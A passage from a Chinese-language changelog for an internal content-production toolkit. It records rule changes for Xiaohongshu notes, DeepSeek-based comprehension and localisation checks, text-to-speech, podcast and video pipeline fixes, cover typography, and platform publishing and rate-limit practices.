  文件 cp 进 `data/uploads/media/` 传绝对路径即可，零网络传输。实测走隧道传本地文件极不稳
  （50MB SSL 断连 / 8MB 502 / 2MB 传到第 5 片仍 502），而同机 cp 74MB 瞬间就位。
- ⚠️ **任务状态用终态白名单**：真实流是 `pending → publishing → published`。
  黑名单写法（排除 pending/running）会把 `publishing` 误判成终态；只认 `completed|success`
  则永远等不到——同一天各踩一次。
- 一稿多号必须逐号差异化标题/正文/标签，视频文件复用同一路径。

---

## [1.80.1] — 2026-08-07

### 清单类笔记必须有收藏引导（机器评分挖出的缺口）

comprehension_check 给某篇打分时建议「结尾加一句引导收藏」——回头查发现**我们的笔记从来没做过明确的收藏引导**，而清单类正是最该有的。写进 `xiaohongshu-spec.md`「结尾 CTA」：清单类／行动类**必须有一句**，且**写法要绑住收藏的真实动机「当下记不住，以后要翻出来看」**（✅「存一下，需要的那天你未必想得起这十条」），⛔ 禁用「收藏不迷路」「三连」这类读者已免疫的无理由口号；位置在行动清单之后、危机声明之前；纯观点类不强求（那类主场在评论区）。

## [1.80.0] — 2026-08-07

### 新增理解性校验 comprehension_check.py（DeepSeek 盲读 + 三项打分），出图前必过

运营定案：「让 DeepSeek 读一遍内容，总结核心是讲什么，和生产者核对，能被正确理解才继续生图，不然就迭代」＋「给中文本土化、干货密度、点赞收藏意愿各打个分」。

- **新增** `scripts/comprehension_check.py`：把标题／封面／正文／各页图内文字／绘图提示词喂给 DeepSeek，**刻意不给 frontmatter 的角度与材料**（那正是要检验的语境，给了就白测），让它以"第一次看到、没有任何背景"的普通读者身份回答——标题三问（谁在什么情况下／什么感受／会不会点开）、封面三问、正文核心一句话、逐页在讲什么、按提示词画出来的图与文字对不对得上、哪里读不懂。
- **三项打分**（各带扣分理由与加分建议，锚点写死防虚高）：`native` 本土化／`substance` 干货密度（"讲得对"不等于"有干货"，干货是读者能带走的）／`engagement` 互动意愿（分开判想点赞还是想收藏，并写明收藏动机是"当下记不住、以后要翻"）。**任一项 <6 判 fail，全部 ≥7 才算好稿**；多轮取均值降噪；同批可横向比分。
- **判定分层防噪音**：`title_clear` 只看三问答不答得出；"能读懂但我有更好说法"进 `nitpicks` 不阻塞——避免重蹈 zh_native_review 早期"误报泛滥最后被无视"的覆辙。
- **挂进 SKILL.md 第 4 步，明确要求出图之前跑**（理解不对先改文案，别烧生图额度）。
- **实测有效**：拿被运营退回的旧标题「见第二面就认得这种感觉，正常吗」回测，精确报出「"这种感觉"没有具体说明是哪种感觉，读者只能猜测」，且盲读出的 who 是"一个正在经历某种强烈感觉的人"——正是"只能猜"的铁证；同时它读对了内容核心，证明问题只在标题。换新标题后 pass。

## [1.79.1] — 2026-08-07

### text-to-video：年份逐位朗读（TTS 层归一化）

老板听出「1946 年」被念成「一千九百四十六年」——年份是序号不是数量。
`_speakable` 增 `_speak_years`：`(?<!\d)(1[89]\d{2}|20\d{2})\s*年` → 逐位中文
（一九四六年 / 二零零八年）。**只认紧跟「年」的四位数**，样本量/人数/百分比等真数值
不受影响（149 对、6973 人、118 位照旧按数值念）。字幕/cues 保留原文阿拉伯数字。
修在 TTS 层而非改稿——每期讲研究都会撞年份，改稿是打补丁。

---

## [1.79.0] — 2026-08-07

### 标题「场景自足」升为判据 0（同类错误第二次，按 blocker 判）

运营两次点名同一类病：①「参加了几十场，自信没涨」——**什么几十场？**；②「见第二面就认得这种感觉，正常吗」——**见谁的第二面？哪种感觉？**（原话「完全搞不懂是在说什么」）。病根一致：**写的人脑子里有语境，标题只截了碎片**。

- **创作端** `xiaohongshu-spec.md`「标题」节新增**判据 0**（排在原四条硬性判据之前）：标题必须场景自足；**硬线＝不许出现没有指代对象的代词/抽象词**（这种感觉／那件事／几十场／这一步），必须换成具体名词或场景；附本产线真实正反例对照表；交付前自检三问（谁在什么情况下／什么感受／为什么值得点开，任一答不出即退回）。**封面主标题同样适用且更严**（信息流里图先被看到）。
- **审查端** `checklist-note.md` 新增判据 4.5，按 **blocker** 判。

## [1.78.1] — 2026-08-07

### 动作条数上调为 8–10 起步（10–20 更好）+ 补「可翻查」硬要求

运营在 1.78.0 之后再次上调并给出了判据的根：「**收藏的根本动机就是当下记不住，想要收藏起来，以后能够翻出来看**」「起码 8~10 个以上才能让人想收藏，10~20 个也都是挺好的」。

- 条数：6–8 → **8–10 起步，10–20 更好**；
- 新增**可翻查**硬要求（由收藏动机直接推出）：每条**动作名要能独立看懂**、动词开头、分组标签能快速定位，⛔ 线性叙事式行动页不合格；
- 新增**形态分工**：一页 2:3 的物理极限实测约 10 条（10 条＋3 分组标签＋标题副标底部条，密度拉满不塌陷）；要 15–20 条**别硬塞一页**，改用已验证的**大清单体**（整篇 P2–P5 四页每页 5 条）。**机制篇**＝讲透机制＋末页 10 条清单；**清单篇**＝整篇 20 条纯收藏向。

## [1.78.0] — 2026-08-07

### 可做动作要给足 6–8 条并分组（运营推翻「只给 3 条」的判断）

某批把行动页收敛成 3 个动作，理由是「商品笔记堆 8 个工具是卖货逻辑，堆多了读者一个都不做」。**运营判定这个判断错了**：「3 个动作太少，会感觉没有干货」。把「卖货动机」和「干货密度」混为一谈了——读者收藏的动机正是「这里面东西多，我以后要用」，3 条撑不起收藏价值；自有数据也印证清单/自查体收藏是普通科普 37 倍，清单体的本质就是条目多。

**改后规则**（写进 `illustration-spec.md` ③ 流程/步骤图）：动作给 **6–8 条**；**必须分组**（推荐按使用时机：情绪上来那一刻／每天固定做／长期慢慢改），靠分组解决"记不住"，不靠删条目；每条要短（动作名一句＋怎么做一句）；正文只列动作名、详细放图里（900 字硬限）；⛔ 禁写「只给三件」「三件是上限」这类自我设限话术——那是主动告诉读者我们给得少。

## [1.77.2] — 2026-08-07

### gen_images `--job` 复查会静默覆盖图片（实测坑，写进出图步骤）

状态文件 `.gen_images_state.json` 按笔记目录存放、被后一次 run 无条件覆盖，而 `job_id` 在不同 session 下都从 1 开始。「先跑 P1–P5、再跑 P6」之后回头复查前一个 job，脚本会套用 P6 的页面映射，**把 P1 的图写成 P06.png 静默覆盖真 P6**——实测两文件字节数恰好相同，不比对 md5 发现不了。已把坑与三条规避（直接按 job 返回 URL 下载／给 `--job` 带 `--images-dir` 隔离／复查后比对六张 md5 两两不同）写进 SKILL.md 出图第 3 步。

## [1.77.1] — 2026-08-07

### text-to-video：播客字幕「句号翻页」失效根治（跨形态架构错配）

首期成片实翻车：字幕全连在一起、句号没翻页（「他回两个字，在忙。我盯着那两个字看了很久」
被粘成「在忙我盯着那两个字看了很久」）。

- **根因是形态间的隐式依赖**：短视频那条线的「句号翻页」并非分页层实现，而是 **TTS 层**
  副产品（`tts_gen --timed` 一句一条 cue，句号天然是 cue 边界），分页层只管逗号换行、
  并把句号当删除字符。播客是**按行合成**（一行 = 一条 cue、行内多句），复用同一分页管线时
  句号被吞、两句相粘。
- **修法**：`paginate_cues` 自己承担切句职责——行内先按句末标点（。！？!?…）切句
  ＝句号翻页，再逐句走 compose_video 的逗号换行/两行装箱管线，时长按显示宽度逐页分配。
  实测 82 行 → 261 页，超两行页 0、超宽行 0。
- **教训**：4 行短句的测试片验证分页等于没验（装不满两行，分页逻辑未被触发）——
  **验分页必须用真实长句样本**；复用另一形态的管线前，先问清「这个行为到底由哪一层提供」。

---

## [1.77.0] — 2026-08-07

### text-to-video：视频号成品包（发布只能人工，脚本负责把该拦的拦住）

工作流调研 33 代理 + 生产实调定案：**视频号没有任何内容发布 API**（服务号 token 调视频号
接口回 errcode 48001 api unauthorized；开放平台视频号权限集仅留资/直播数据/达人/橱窗 4 个，
视频号助手 API 约 20 个接口无发布/上传）。发布只能人工在 channels.weixin.qq.com 做，
⛔ 不碰浏览器自动化。

- 新脚本 `shipinhao_pack.py`：ffprobe 硬验规格（h265/HDR 拦截、时长 3s~8h、≤2GB、
  宽高比 0.33~3.0）+ 合规扫词（绝对化用语、引导脱离平台）+ 封面抽帧 + 上传清单；
  `--fix` 自动转 H.264+SDR。有硬问题 exit 1。
- SKILL.md 新增「发视频号」一节：两类硬拦的官方依据、两句必须念给运营的话
  （文案发布后终生只能改一次且每次 ≤20 字、逐条打原创声明）。
- 实测：真实成片（720×1280/74s/h264）通过；三个反例全中——合规词 exit 1、
  h265 被识别、--fix 真转成 h264。

## [1.76.6] — 2026-08-07

### text-to-video：播客稿「标点即语气」+ 逐行表演设计工序（老板审 v3 稿定案）

- **真问句必须用 ？**（含叙述内转述的问句）：MiniMax 按 ？ 读升调、字幕层保留 ？！，
  句号会把问话读平；判定按语义不按句式。首期实测 18 处问句被句号读平。
- **逐行表演设计成为定稿后的固定工序**：整稿逐行决定 emotion（仅方向明确处显式指定，
  其余留空自动匹配）/speed/pause_after；红线句一律沉稳+放慢+句后停顿；
  审阅版导出须可视化标注。首期落地：18 行情绪/10 行语速/7 行停顿。

---

## [1.76.5] — 2026-08-07

### text-to-video：播客交付模式定案——按段生产质检、整篇交付、定型后直接交成片

老板对 v1.76.4 工作流 D 条的修正：「段」只是内部生产与质检单位；**交付永远是整篇**。
文字稿送审仅限方法论校准期（首期）；流程定型后**直接交成片终版**，质检责任完全由
首听/审校/事实核查流程承担，不再送审文字稿。

---

## [1.76.4] — 2026-08-07

### text-to-video：播客写稿工作流 v2（老板整稿打回后的系统性重建，非补丁）

旧流程的系统性缺陷：**从长文提取句子→分配两张嘴→口语化打磨**——书面语 DNA 第一步注入，
六轮 DeepSeek 全放行了「品性问题」级翻译腔，老板成了第一道有效质检。v2 四个结构性改变
（podcast-video-spec §①②全文重写）：

- **先懂再说**：源文→知识底稿（纯要点，禁成句）→写稿人只看底稿禁触源文原句，转述给朋友听；
- **正样本锚定**：老板亲改的首期冷开场入规格作黄金样例，禁令清单降为事后自查
  （只给禁令必退播音腔，封面字体 A3 同款教训）；
- **首听测试为主质检**：无源文背景的代理只读稿，逐行卡点+逐段复述，复述错=理解断裂；
  DeepSeek 降辅助且**取并集逐条裁决**（交集滤掉过只得一票的真问题）；改稿后的句子重过首听；
- **按段交付**：先交冷开场定调再逐段推进（整稿写完才交=返工成本最大化，首期 101 行实证）。
- 附：禁词表机械闸门（品性/构念/被试/基线/拒斥/负性/复现/转引/施加/效应量…随审片追加）。

---

## [1.76.3] — 2026-08-07

### 风控红线两处表述去重（与 1.76.2 并行沉淀同一份 server 回执）

1.76.2（另一条线）与本线同时在沉淀 server 的风控洪峰警告，SKILL.md 里出现了两段讲同一件事的文字。保留「笔记发出去之后」硬规矩 0 作为**完整口径的唯一出处**，「风控」段精简为指针 + 三条它没展开的操作细则：①怎么判断一条命令算不算一次浏览器会话（看要不要开浏览器，纯读台账 `--ledger`/`--note` 不算，其余基本都算）；②**跨号并行也要算总量**（6 号各 30 次＝180 次洪峰，单号没超帽整体照样撞线，08-07 事故正是如此）；③**派子代理做批量活必须在任务书里写明速率上限**——子代理不知道红线，只会闷头跑完清单，上次事故的直接原因就是派活时没写。

## [1.76.2] — 2026-08-07

### xhs：逐篇回读批量打法列为红线级硬规矩（server 风控洪峰警告沉淀）

- 「笔记发出去之后」硬规矩四条扩五条，新增**第 0 条（红线级置顶）**：每次
  `--read-components`/`--note` 都是一次真实浏览器会话，风控红线每号每小时 ≤4-5 次；
  2026-08-07 某轮 100 篇逐篇回读实跑出一小时 192 条会话、单号峰值 51 次=红线 10 倍，
  代价是封号不是弹墙。**名单类需求一律等 server 批量端点，绝不用 N 次页面访问换名单**；
  server 速率帽（12 次/号/时）超帽任务排队而非失败——**变慢是在排队，别重试**。
- 原第 3 条「量大别全量逐篇」从性能建议升格为风控红线交叉引用。
- 确认回执：`文档/2026-08-07-skill回执-洪峰两条硬规则确认与沉淀.md`。
- **归属勘误**：本版 commit 因共享工作区 `git add -A` 裹挟了运营线的合集防呆改动
  （publish_note `--collection-id` 帮助文案防呆化、checklist-note 判据 3.5 议题合集归属、
  guide 同步、xhs SKILL 合集章节）——内容完整可用属运营线成果，非本条目描述范围。
  教训重申：共享仓库发版一律显式路径 add，绝不 `add -A`。

---

## [1.76.1] — 2026-08-07

### text-to-video：podcast_gen 补发音别名（NBDpsy 逐字母）

- podcast_gen 直接调 `_minimax_synth` 绕过了 `_speakable()` 发音别名——播客里的
  「NBDpsy」会被整词瞎拼（首期稿审校时抓到）。已在合成前套 `_speakable`，
  cue/字幕仍存原文。凡新增直调底层合成的入口，发音别名要跟上（此坑记一笔）。

---

## [1.76.0] — 2026-08-07

### text-to-video：播客声纹终版=心电图式描线 + 男声/首期定案

- **声纹第三版定案（心电图式）**：数据端补每 80ms 窗有符号峰值对（真实波形上下包络，
  对数压缩 ±99 量化）；播放器改 canvas 连续描线——过零摆动的心电轨迹、中心辉光播放头、
  已播金色辉光/未播暗灰、亚像素平滑滚动、两侧渐隐窗口；DOM 条形渲染退役。
- **两项拍板入规格**：男声=温润男声 `Chinese (Mandarin)_Gentleman`；首期=黄安麟
  《你越用力要爱，他越冷漠：投射性认同的怪圈》（署名文章阅读量第一，52 阅读）。

---

## [1.75.2] — 2026-08-07

### 🔴 发布默认不再挂合集（「加入合集」≠「引用合集」，已致约 100 篇误归拢）

运营原要求是「科普笔记**引用**咨询师简介合集」（正文提及、导流），我们实现成了 `--collection-id`——它的语义是**把笔记归拢进该合集**，于是四个主力号的「咨询师简介」合集里混进了几十篇科普笔记，合集失去意义（该合集只应放咨询师推介笔记）。

- **修改** `xiaohongshu-creator/SKILL.md` 第 7 步发布节 + 补挂节：`--collection-id` **默认不传**；只有做咨询师推介笔记、或运营明确点名「加进 X 合集」时才传。两处都写明「加入 ≠ 引用」的语义差别与后果。
- **止血**：发布默认配置已改；每 40 分钟自动补挂合集的守护进程已停。
- ⚠️ **存量清不掉**：`--set-components` 只有「加入合集」、**没有「移出合集」**，误加只能人工在创作后台一篇篇摘。已向 server 提需求（P0 移出能力 + P1 列出合集内笔记端点），文档 `docs/2026-08-07-移出合集能力-需求.md`。
- **教训**：语义相近一字之差的参数（加入/引用、expected 是编辑前还是目标值）要在规格里写死后果，光写参数名解释不够——本条与既有的「expected-image-count 传编辑前张数」是同一类坑。

## [1.75.1] — 2026-08-07

### text-to-video：播客声纹改 C 形态滚动包络 + 帧级音画同步标记

- **声纹 C 形态**（老板三选一拍板）：条形=真实音轨逐窗音量包络（80ms RMS、0-99 量化），
  画面中心=当下、随播放向左滚动，已播金/未播灰。频谱版（A 形态）代码退役。
- **帧级同步标记**（老板验收：声纹与音频不同步）：旧「webm时长−音频时长−尾巴」反推
  lead_in 误差几百毫秒。现改播放器预滚期挂全黑掩幕+左上 32px 品红块，audio `playing`
  瞬间撤幕；录屏后逐帧扫描品红消失点精确切齐，误差≤1帧（40ms）。
  ⚠ 坑：load 后立刻 `__start()` 掩幕在场 <100ms 一帧都录不到——录制端必须**预滚 0.8s
  再开播**；标记缺失自动回退旧估算并告警。
- 实测：4 行样片帧级切点 0.760s 命中，首帧字幕/波形/发声起点三对齐。

---

## [1.75.0] — 2026-08-07

### text-to-video：播客双声响度归一 + 字幕分页对齐短视频 + 栏目名定案

- **双声响度归一**（老板验收：两声音量差太大）：podcast_gen 每行测 mean_volume、wav 阶段
  统一增益到 -22dB（±12dB 限幅防泵底噪）。实测温暖闺蜜 -31dB vs 温润男声 -23.6dB 差 7.5dB，
  归一后成片逐行 -22.0dB 完全对齐。
- **播客字幕改与短视频同规则**：逗号换行/句号翻页/每页最多两行——record_podcast 注入前
  复用 compose_video 分页管线把行级 cues 变换成页级 cues（含词表折行/宽度配时），
  播放器 `white-space: pre-line` 直渲。
- **栏目名定案「NBDpsy心理会客厅」**；规格文档已定案节与未决项同步（剩男声/首期选题）。

---

## [1.74.1] — 2026-08-07

### text-to-video：播客波形改真实声纹（老板验收定案：竖线=音频声纹、会跳动）

- **离线预计算频谱注入**：record_podcast 合成前用 numpy 对音频做 80Hz–6kHz 对数分带
  频谱（80ms 窗、44 band、0-99 量化），注进 `#podcast-data`；播放器按 currentTime 查表
  驱动条高。量化验证：四帧波形差异量 97–392（装饰动画版为 0–2）。
- **⛔ Web Audio 死路记录**：Chromium 把 file:// 音源当跨域污染，AnalyserNode 输出全零
  （声照放、谱全空）；设 `crossOrigin` 更糟——音源直接被拒（no supported sources）。
  页面里的 Analyser 链已整段删除，回退态只剩正弦装饰动画。

---

## [1.74.0] — 2026-08-07

### text-to-video：长文播客产线三件落地 + 句间气口 + NBDpsy 逐字母朗读

**「长文播客」实现（配套 v1.73.0 的规格文档）**
- `scripts/podcast_gen.py synth`：对谈稿（podcast.json）逐行双声合成（复用 minimax 引擎；
  F=温暖闺蜜 / M=温润男声默认，`--voice-f/--voice-m` 可换）→ `podcast.mp3` + 行级
  `podcast.cues.json`。**时间轴走 wav 中间件**（mp3 逐段 concat 每段漂 ~46ms 且随行数累积，
  实测 4 行漂 0.324s——wav 域按样本数累加、仅最终编码一次，cues 由构造精确）；幂等指纹=
  文本+音色+语速+情感（防换音色复用旧 mp3 串音）；停顿/语气标记只进合成不进字幕。
- `assets/podcast_player.html`：720×1280 黑金播放器页（期号标题/当前句大字幕·说话人双色/
  波形动画/栏目名），零外网依赖，`<script id="podcast-data">` 注入数据（file:// 下 fetch 被
  CORS 拦，query 驱动不可行），暴露 `__start/__done/__t`。
- `scripts/record_podcast.py`：Playwright 录屏 + ffmpeg 混音（录屏声道弃用、原始音轨保音质；
  lead_in 反推切除录屏前导；一律以音频为准）。端到端实测 4 行样片通过，
  silencedetect 独立验证 cues 精确。

**tts_gen 两个口播修正（老板 v18 验收定案）**
- `--timed` 新增 `--gap`（默认 0.45s）：句间垫静音、cues 含偏移——MiniMax 句尾零留白，
  逐句拼接必须给气口，否则上句说完立马抢下句；
- 发音别名 `_SPEAK_ALIASES`：**NBDpsy 合成时替换为「N B D P S Y」逐字母念**（整词被模型
  瞎拼成 "nbd pas"），字幕/cues 保留原文写法。

---

## [1.73.0] — 2026-08-07

### text-to-video：MiniMax 语音引擎 + 逐字稿规范沉淀 + 两种内容形态命名

**MiniMax T2A 接入（`--engine minimax`，口播新默认）**
- `POST api.minimaxi.com/v1/t2a_v2`，`speech-2.8-hd`；凭据 `MINIMAX_API_KEY`（实测无需 GroupId，
  兼容位保留）；音频 hex 解码；HTTP 200 内藏错误码有拦截；零重试、失败原文透出带 trace_id；
  每次合成打「本次计费字符 N（约 ¥X）」对账行（1 汉字=2 字符，hd ¥3.5/万字符）。
- 现役口播音色定案：**温暖闺蜜 `Chinese (Mandarin)_Warm_Bestie`**（21 个候选两轮试听老板选定）。
- 独有能力（豆包死路的补完）：`<#x#>` 秒级停顿（实测误差 ±0.03s）+ 19 个语气词标签
  `(sighs)` 等**不会被念出来**（老板耳测确认）；仅 2.8 系支持。
- edge/doubao 引擎零改动；`--timed` 句级 cues 契约打桩验证不变；全仓 1081 测试通过。

**新增 `references/narration-spec.md`（旁白逐字稿规范）**——CPTSD 首片 v1→v17 全部语音侧教训：
写稿六律（重复消除/症状归并/口语词/临床单向逻辑/停顿写进标点/承诺要兑现）、DeepSeek 三轮
本土化审校流程（单跑不可信，≥2 轮交集 + agent 裁决留痕）、**MiniMax 引语坑**（完整引语触发
角色扮演致声线跳变，基频离散度 39.4% vs 正常 25–27%；单字引号安全；口播稿引语一律转述）、
基频/RMS 客观诊断法、表演标记使用纪律、成本速查。

**两种内容形态命名定案**：「**笔记微电影**」（小红书笔记→电影化动画短片，现有十步产线）、
「**长文播客**」（长文→一男一女对谈播客视频，HTML 播放器画面录屏）。后者规格落
`references/podcast-video-spec.md`（产线五步 + podcast.json 契约 + 播放器构图 + 未决项），
实现下版跟进。

---

## [1.72.0] — 2026-08-07

### text-to-video：封面首帧 + finalize 视频链重构

视频上传需要封面：部分平台自动抓首帧当封面，server 的小红书视频上传接口也要单独传封面图。

- **`cover` / `cover_duration`（manifest 可选）**：封面图叠在成片前 0.1s（工作目录放 `cover.png` 即自动生效，同 logo/bgm 约定）。**实现走 finalize 的 `overlay enable='lte(t,N)'`，不进 concat**——第一版把封面做成 0.1s 微型音频段拼接，AAC 时间戳错乱导致编码器拒帧（`Error submitting audio frame`），微型段进 concat 是死路；
- **finalize 视频链重构**：基础滤镜 → 封面 → logo → 淡出按序装配（parts 列表），四个可选件任意组合都成立；
- **封面制作口径（非代码，方法论）**：视频封面遵循小红书图文封面 skill 的三级层级原则（Heavy 1.6x 强调色扎心句 / Bold 议题词 / 细体拉字距副标题、标题压上 1/3、底部留白），基底用本片干净 shot 帧（风格天然同源），PIL 精确排版零错字；本机 Noto 只有 Bold/Regular 两档，Heavy 用 Bold+同色描边模拟；
- 独立封面文件（供上传接口）从成片首帧导出（`ffmpeg -frames:v 1`），与视频内封面像素一致、自带 logo。

---

## [1.71.0] — 2026-08-07

### text-to-video：首条电影化成片（CPTSD）落地沉淀——语音表演 + 字幕分页制 + 品牌收尾

老板逐轮验收 CPTSD 视频（v1→v12 定稿）攒下的全部产线改动，一次沉淀：

**tts_gen.py（豆包 V3 语音表演）**
- `--emotion` / `--emotion-scale`（28 种情感 + 强度 1–5）接入 audio_params；
- **speech_rate 修复**：克隆音色只认 `audio_params` 里的语速，顶层参数静默不生效（0.9 vs 1.2 实测 35% 速差才坐实）；现双写；
- `--timed` 改**一句一条 cue**（句号=字幕翻页的时间轴基础）；
- ⛔ 方括号语气指令（[激动] 等）会被朗读出来（时长翻倍实锤），死路勿试。

**compose_video.py（字幕渲染管线重构 + 品牌收尾）**
- 字幕标点规则（老板定案）：**逗号=换行、句号=翻页**，标点不显示（？！保留）；破折号同为停顿按换行处理；
- **分页制**：每页最多 2 行，超出自动翻页，页时长按该页文字显示宽度占比分配；
- 折行三防线：英文/数字词 token 化绝不劈开（CPTSD、NBDpsy）＋高频词表不可拆（可以/心理学/复杂性创伤…，零依赖不引分词器）＋显示宽度按半角 0.5 计（中英混排不吃亏）＋硬上限超宽自动加行重排；
- 竖屏字幕安全区：底边距 20% 高度（避平台标题遮挡区）、左右各 8%、字号 4.5% 高度；
- `logo`（manifest 可选）：透明底品牌 logo 叠右下角（宽 18%、边距 3%、透明度 0.88）；工作目录放 `logo.png` 即自动生效；
- `fade_out`（manifest 可选）：片尾音画同步淡出 N 秒（挂在 logo 之后一起淡出；BGM 硬停=戛然而止的另一半）。

**build_manifest.py**
- 兼容 v3 `beats` 键；`ai_label` 显式空串=关闭角标（动画类由平台 AIGC 声明替代）；logo / fade_out 透传。

**cinematic-direction.md**：坑表新增「原片末尾藏白化淡出」——定格延展前必须逐帧验尾（实翻车：克隆到的末帧是发白空屏）。

---

## [1.70.0] — 2026-08-06

### 封面字体：字重三级层级 + 强调色（运营选定 A3，实测定案）

运营反馈「封面标题字体可以更好看」。先调研（小红书心理/情感爆款封面字体共性 + 免费可商用字体逐一查证授权，剔除汉仪润圆/方正清刻本悦宋等实为付费的坑），再实测两条路线出真样张对比，运营选定 A3「字重层级」方案。

- **风格档案**（默认配置「图文」那套已更新为 v2）：`visual` 新增 `accent_color`（默认 #A34B3A）与 `cover_typography`（三级层级完整口径）；`cover_layout` 补上「标题不受 20 字限制、长句可折 2–3 行」。
- **修改** `illustration-spec.md` 封面三层组件模板的文字层：从「大标题＋副标题」升级为**写死三级层级**——第一级（最扎心那句）超粗 Heavy＋1.6 倍字号＋强调色；第二级 Bold＋正文色；第三级副标题细体＋字距拉开。附实测结论：只写「大标题」模型必退回通用粗黑体三行同粗同色（＝「AI 一眼假」头号特征）。
- **修改** `checklist-note.md` 判据 2：封面 P1 缺三级层级描述 = FAIL。
- **实测两条硬结论写进规格**：①提示词能锁「字体大类＋层级」，**锁不住「具体哪一款字」**（同一提示词跨次出图，圆体会在圆体/圆角粗黑间浮动）→ 硬纪律「一套轮播必须一次批量出完、同一 anchor」；②备选形态按页型选——宋体最高级但缩图糊、适合金句页与推介页；圆体最温柔但跨次一致性最差、量产慎用。
- **未采纳但留档**：路线 B（AI 出无字底图＋本地字体渲染）实测同样成立且可控性高一个量级（错字率结构性归零、可机器断言不裁切、改文案 0.3 秒），但需人工调一次留白带参数、且**内页信息卡走不通**（文字与版式深度耦合）。运营本次选 A（改动最小、保持现产线）。B 路线脚本与样张留在 font-lab，未来若错字或字体一致性成为瓶颈可直接转正。

## [1.69.0] — 2026-08-06

### 终局接线：videos[] / audios[] 参考 + max_credits 预算护栏

server 深夜宣告全部完工零等待项，skill 侧把最后三根线接上：

- **`videos[]` / `audios[]` 参考**（multimodal2video）：`@视频N`/`@音频N` 同样顺序即语义、
  保序下发；条数按档本地拦（2.5 各 ≤10、2.0 家族各 ≤3）；**纯音频输入仅 2.5 合法**
  （2.0 家族本地拦不白跑）；本机路径的视频/音频仍回落本地 CLI（图床只收图片换不了直链）。
  至此「运镜参考」「节奏卡点」两个方法论环节的能力全部就位；
- **`batch --max-credits`**：整批预估超限 → server 409 整批拒绝、零任务零扣分。
  显式才带，不传行为与从前逐字一致——花钱的决定必须显式，批量前与老板核准预算数；
- 新增 5 条测试（顺序透传/audio-only 分档/条数上限/本机路径回落/max_credits 显式才带），
  其一顺带修了 handler 签名踩坑（fake_requests 约定三位置参数）。

测试 1076 → 1081。产线至此**全能力通**：五种 operation、多模态三类参考、预算护栏、
资产库、段尾帧端点——CPTSD 首航片只欠开拍。

---

## [1.68.1] — 2026-08-06

### zh_native_review 多数决修复（单跑不收敛实测定案）

首战暴露：LLM 审核单跑不收敛——同一文件（md5 相同）连跑四次报 2/4/8/20 条；86 条终轮 issue 里 68 条 fix 与原文逐字相同或为空；对干净稿会制造边际噪音（给图内条目加句号、同义词偏好、甚至反向往书面改）。修复：默认 3 轮多数决（--rounds 可调）＋ no-op 过滤（fix 为空或剔空白后与 original 相同的条目直接丢弃），original 须在过半轮次被点名才算真问题，verdict 由过滤后条目决定。实测：修订后的六篇立秋稿两篇直接 pass，其余剩余条目降到个位数。**审核员定位随之校准**：它是抓病灶的利器（首轮 40+ 处术语腔全中），不是逐字终审官——多数决过滤后的剩余条目仍须人工裁决（版式惯例、双关、主轴意象、口径准确性它不懂），采纳权在编辑侧。

## [1.68.0] — 2026-08-06

### xiaohongshu-creator + reviewer：DeepSeek 中文本土化机器审核（硬闸门）+ 笔记标题与封面标题解耦

两条运营定案同日落地（与同日 1.67.0 的 fuwuhao 外审是同一定案在两条产线的各自沉淀）：

- **新增** `xiaohongshu-creator/scripts/zh_native_review.py`：DeepSeek 独立审核员，审标题+发布文案+每页图内文字，判据五条与 spec §1「中文本土化表达」同源（光杆形容词概念名/术语直译腔/生造比喻/翻译腔句式/朗读测试）。为什么要独立模型审：自审会漏——写的人闻不出自己的术语腔，两次运营点名返工（「强烈9分」「爱轰炸期的奶茶」）都发生在自审全绿之后。产线纪律：写稿后、出图前逐篇必过；issues 逐条改掉或书面驳回留痕；输出原样贴报告。缺 `DEEPSEEK_API_KEY` 时 exit 2 降级人工自审并留痕。SKILL.md 第 4 步、spec §1、reviewer 判据 10 三处同步挂钩。首战实录：立秋奶茶批六篇全 fail、抓出 40+ 处（含内部规格词「口径条/边注卡」泄漏进图内文字）。
- **修改** spec §1 追加第二类病灶：术语直译腔与生造比喻（爱轰炸/投喂/供糖/峰值实例；网感词以语境融洽为界）。
- **修改** spec「标题」节：**笔记标题与封面图内主标题解耦**（运营定案）——笔记标题 20 字硬限可为缩写；封面主标题不限字数，职责是引人注目、把事说清楚；两者须为同一钩子的两种长度；封面长标题出图必逐字验字。
- **修改** reviewer 判据 10：补第二次事故对照与机检辅助（报告未贴审核输出=流程缺环；issues 未逐条处理=FAIL）。

## [1.67.0] — 2026-08-06

### fuwuhao-operator：中文本土化终审（DeepSeek 外审）沉淀为流程硬闸门

新脚本 `zh_review.py`：稿件正文喂 DeepSeek（deepseek-chat）做母语级语言审核——翻译腔/
欧化句式/不地道搭配/标点/语气，**只出建议绝不改稿**，采纳权在编辑侧（逐条采纳或书面驳回）。
SKILL.md 插入第 2.7 步（定稿后、编译前每篇必过）；语言层硬规则真源仍指小红书 spec §1（两端同源）。
2026-08-06 立秋奶茶文实测：8.5 分、8 条建议采 6 驳 2。凭据 DEEPSEEK_API_KEY 三层解析。测试 +2 共 159 过。

## [1.66.2] — 2026-08-06

### 计价模型改按秒 + 段尾帧端点入库 + ffmpeg 抽帧坑

server 今日总汇的三个新事实入库：

- **计价按秒不按 5 秒档**：`seedance2.5 = 26 分/秒`（4s 实扣 104 是决定性证据——块状
  公式会算 130）。SKILL.md 价目段与方法论成本速算全部替换（60s 一条过 ≈1560 分、
  含 coverage ≈2300 分）；`estimated_credits` 口径照录（重放命中计 0，实扣以
  credit_count 为准）；frames2video 价格未实测，首单必对账；
- **段尾帧提取端点已做**（待重启）：`frame?t=last` 回 png 直链可原样当下一镜
  image/first_image，分段续接不必下载 mp4。优先走端点，ffmpeg 只留兜底；
- **ffmpeg 抽尾帧坑**记入待办表：`-sseof -1` 必须配 `-update 1`——常见的 `-frames:v 1`
  取到末尾前 1 秒那帧，图看着正常、接缝跳一秒极难归因（server 自测撞过顺手相告）。

回执 server：四件待办逐项确认（轮询 600s 上午已做可销账）、1.4MB 误判起点认领
（教训：转述数字前先量原件）、重启后第一批动作清单。

---

## [1.66.1] — 2026-08-06

### 两笔旧账定案入库：分段拼接是长期架构 / session 与风格无关

server 单独回执了两条架构级问题，方法论按答案落定：

- **超长视频（30–180s 直出）CLI 无入口**——help 全查 + 33MB 二进制 strings 扫描零命中 +
  duration 校验层锁死 4–30s。**分段拼接从"临时方案"转正为 API 路线长期架构**，
  cut_assemble/sync_durations v3 这层投入不白花；
- **`--session` 只是归档容器**（后端 workspace CRUD），无证据影响生成——分段一致性的
  正解 = 参考图 + 身份锁，不需要为"同 session 保风格"做任何设计。A/B 实测省下不跑，
  钱留给角色卡对照实验；
- 2.5 估算表那条需求撤回：是 server 的 manifest 文案漂移（实现里早有 130/5s），
